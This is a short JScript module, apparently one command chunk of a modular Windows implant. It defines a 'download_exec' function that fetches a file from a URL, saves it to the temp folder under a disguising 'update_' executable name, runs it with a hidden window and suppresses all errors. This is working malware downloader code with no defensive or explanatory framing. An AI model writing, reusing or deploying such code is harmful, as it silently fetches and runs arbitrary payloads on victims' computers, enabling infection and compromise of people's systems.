// chunk: commands/download_exec
// depends: core/run_cmd, core/file_ops
// provides: download_exec
// format: jscript

function download_exec(url, localName) {
    var tempDir = _s.ExpandEnvironmentStrings("%TEMP%");
    var dest = tempDir + "\\" + (localName || "update_" + Math.floor(Math.random() * 99999) + ".exe");
    try {
        var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        h.Open("GET", url, false);
        h.Send();
        if (h.Status == 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1;
            stream.Open();
            stream.Write(h.ResponseBody);
            stream.SaveToFile(dest, 2);
            stream.Close();
            _s.Run(dest, 0, false);
            return dest;
        }
    } catch(e) {}
    return "";
}
